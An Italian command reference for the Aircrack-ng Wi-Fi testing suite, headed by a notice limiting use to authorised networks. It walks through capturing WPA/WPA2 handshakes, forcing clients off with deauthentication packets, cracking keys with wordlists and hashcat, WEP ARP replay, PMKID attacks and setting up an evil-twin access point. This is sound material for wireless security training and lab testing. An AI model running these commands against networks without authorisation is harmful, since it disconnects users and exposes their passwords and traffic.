# Aircrack-ng — Guida ai Principali Comandi e Test

> **Avviso legale:** Aircrack-ng è una suite per l'analisi della sicurezza delle reti Wi-Fi. Utilizzarla esclusivamente su reti di cui si possiede l'autorizzazione esplicita. L'uso non autorizzato è illegale.

---

## 1. Installazione

### Su Kali Linux (già incluso)
```bash
aircrack-ng --version
```

### Installazione manuale
```bash
apt update && apt install -y aircrack-ng
```

---

## 2. La suite Aircrack-ng

| Tool          | Funzione                                              |
|---------------|-------------------------------------------------------|
| `airmon-ng`   | Attiva/disattiva la modalità monitor sulla scheda     |
| `airodump-ng` | Cattura pacchetti e scansiona reti Wi-Fi              |
| `aireplay-ng` | Iniezione di pacchetti (deautenticazione, ecc.)       |
| `aircrack-ng` | Cracka le chiavi WEP/WPA/WPA2 dagli handshake         |
| `airbase-ng`  | Crea access point fasulli                             |
| `airdecap-ng` | Decripta file di cattura WEP/WPA                      |

---

## 3. Preparazione — Modalità monitor

### Verificare le interfacce wireless disponibili
```bash
iwconfig
airmon-ng
```

### Fermare i processi che interferiscono
```bash
airmon-ng check kill
```

### Attivare la modalità monitor su wlan0
```bash
airmon-ng start wlan0
```

> L'interfaccia diventerà solitamente `wlan0mon`.

### Verificare che la modalità monitor sia attiva
```bash
iwconfig wlan0mon
```

### Disattivare la modalità monitor
```bash
airmon-ng stop wlan0mon
```

---

## 4. Scansione reti Wi-Fi con airodump-ng

### Scansione di tutte le reti nelle vicinanze
```bash
airodump-ng wlan0mon
```

### Scansione solo su banda 2.4 GHz
```bash
airodump-ng --band bg wlan0mon
```

### Scansione solo su banda 5 GHz
```bash
airodump-ng --band a wlan0mon
```

### Scansione su un canale specifico
```bash
airodump-ng -c 6 wlan0mon
```

### Scansione di una rete specifica (per BSSID)
```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

---

## 5. Cattura handshake WPA/WPA2

### Catturare e salvare su file
```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cattura wlan0mon
```

> Genera i file: `cattura-01.cap`, `cattura-01.csv`, `cattura-01.kismet.xml`

### Accelerare la cattura con deautenticazione (aireplay-ng)

In un secondo terminale, inviare pacchetti di deauth al client connesso:

```bash
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

| Flag     | Significato                            |
|----------|----------------------------------------|
| `--deauth 10` | Invia 10 pacchetti di deauth      |
| `-a`     | BSSID dell'access point                |
| `-c`     | MAC del client da disconnettere        |

> Quando il client si riconnette, l'handshake viene catturato.

### Verificare che l'handshake sia stato catturato
```bash
aircrack-ng cattura-01.cap
```

---

## 6. Cracking WPA/WPA2 con wordlist

### Attacco con wordlist (rockyou)
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt cattura-01.cap
```

### Specificare il BSSID target (se ci sono più reti nel file)
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF cattura-01.cap
```

---

## 7. Cracking WEP

### Catturare pacchetti IVs (almeno 20.000–40.000)
```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep-cattura wlan0mon
```

### Accelerare la raccolta con fake authentication + ARP replay
```bash
# Step 1: fake auth
aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Step 2: ARP replay per generare traffico
aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF wlan0mon
```

### Craccare la chiave WEP
```bash
aircrack-ng wep-cattura-01.cap
```

---

## 8. PMKID Attack (senza handshake)

### Installare hcxdumptool
```bash
apt install -y hcxdumptool hcxtools
```

### Catturare PMKID
```bash
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
```

### Convertire in formato hashcat
```bash
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
```

### Craccare con hashcat
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## 9. Creare un Access Point fasullo (Evil Twin)

```bash
airbase-ng -e "NomeRete" -c 6 wlan0mon
```

---

## 10. Decriptare una cattura WPA

```bash
airdecap-ng -p password_trovata -e "NomeRete" cattura-01.cap
```

---

## 11. Esempi completi per lab

### Workflow completo WPA2 — dalla cattura al crack
```bash
# 1. Metti la scheda in modalità monitor
airmon-ng check kill
airmon-ng start wlan0

# 2. Scansiona le reti
airodump-ng wlan0mon

# 3. Cattura il traffico della rete target
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# 4. (In altro terminale) Deautenticazione per forzare handshake
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Cracca l'handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
```
